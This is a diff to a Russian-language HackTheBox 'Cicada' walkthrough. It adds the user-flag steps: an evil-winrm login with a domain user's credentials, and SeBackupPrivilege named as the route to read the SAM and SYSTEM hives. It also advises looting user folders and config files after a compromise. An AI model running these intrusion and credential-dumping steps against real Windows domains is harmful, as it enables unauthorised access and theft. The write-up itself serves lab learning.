@@ -303,7 +303,7 @@ SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ        
 
 К сожалению, мы не имеем достаточно прав, чтоб как-то взаимодействовать с этими шарами
 ```
-Hexada@hexada ~/Downloads$ smbclient //cicada.htb/IPC$ -U michael.wrightson                                                                                                         130 ↵  
+Hexada@hexada ~/Downloads$ smbclient //cicada.htb/IPC$ -U michael.wrightson 
 smb: \> ls
 NT_STATUS_NO_SUCH_FILE listing \*
 ```
@@ -312,7 +312,7 @@ Hexada@hexada ~/Downloads$ smbclient //cicada.htb/NETLOGON -U michael.wrightson
 do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESSFUL)
 ```
 ```
-Hexada@hexada ~/Downloads$ smbclient //cicada.htb/SYSVOL  -U michael.wrightson                                                                                                        1 ↵  
+Hexada@hexada ~/Downloads$ smbclient //cicada.htb/SYSVOL  -U michael.wrightson
 do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESSFUL)
 ```
 
@@ -320,7 +320,7 @@ do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESS
 
 **RPC**
 ```vbnet
-Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ rpcclient -U michael.wrightson cicada.htb                                                                                       1 ↵ main 
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ rpcclient -U michael.wrightson cicada.htb
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Password for [WORKGROUP\michael.wrightson]:
 rpcclient $>
@@ -372,7 +372,7 @@ whenChanged: 20250108084925.0Z
 
 Теперь у нас есть доступ к двум учетным записям, давайте посмотри какие привелегии имеет учетная запись `david.orelious`
 ```vbnet
-Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u david.orelious -p 'aRt$L*****' --shares                                    130 ↵ main 
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u david.orelious -p 'aRt$L*****' --shares
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$L*****
 SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
@@ -428,22 +428,9 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 **WinRM** — это сервис, предоставляющий возможности удаленного администрирования через **HTTP** и **HTTPS**. Он является частью **Windows Management Framework** и ориентирован для выполнения команд на удаленной машине.
 
-Кстати, я обратил на кое что внимание, когда я только-только сканировал порты, на 5985 порте работал следуйщий сервис:
-```vbnet
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-```
-
-А если его сейчас сканровать, то вывод будет другой:
-```vbnet
-PORT     STATE SERVICE
-5985/tcp open  wsman
-```
-
 Давайте попробуем войти в **WinRM** через `emily.oscars`
 ```vbnet
-Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'                                                                      main 
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#*****'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -454,6 +441,76 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
 ```
+
+Прекрасно, теперь нам остается забрать **User Flag**, и сдать его на **HTB**
+
+```
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd ..
+```
+
+```
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
+```
+
+```vbnet
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls
+
+
+    Directory: C:\Users\emily.oscars.CICADA\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         1/11/2025   1:11 AM             34 user.txt
+```
+```
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> more user.txt
+b6b7ed8e192e6aaf2fff2ac943d4efe9
+```
+
+Поздравляю, мы получили **User Flag**!
+
+---
+
+**Почему все флаги виртуальных машин, принято хранить в User/Desktop?**
+Стоит учитывать, что в настоящих условиях, когда компрометация пройшла успешно, нас первым делом интересует не только `User/Desktop`, но и `Documents`, `Downloads`, `Pictures`, `Videos`. 
+Также, папки с системными настройками или конфигурациями, такие как `AppData` (в **Windows**) или скрытые файлы в **Linux** (`.config`, `.bashrc`), могут содержать логины, пароли или ключи доступа.
+
+**Скомпрометировать** — это термин, который обозначает, что система, данные или учетные записи подверглись неавторизованному доступу или изменению.
+
+Так что, все флаги принято ложить именно в эту директорию, чтоб все пользователи сразу знали где нам нужно искать флаги.
+
+Теперь давайте займемся поиском **Root Flag**:
+```
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 
+```
+
+Нас интересует привелегия **SeBackupPrivilege**: именно она наш ключ к полечению второго флага
+
+**SeBackupPrivilege** — это привилегия в Windows, которая позволяет пользователю создавать резервные копии файлов и папок, включая те, к которым у пользователя нет прямого доступа.
+
+В контексте компрометации системы, привилегия **SeBackupPrivilege** позволяет читать критически важные системные файлы, такие как:
+`C:\Windows\System32\config\SYSTEM`
+`C:\Windows\System32\config\SAM`
+
+**SAM** — это файл реестра, который хранит информацию о пользователях, их паролях и хешах. Он используется Windows для аутентификации пользователей.
+
+
+
+
+
 
 
 
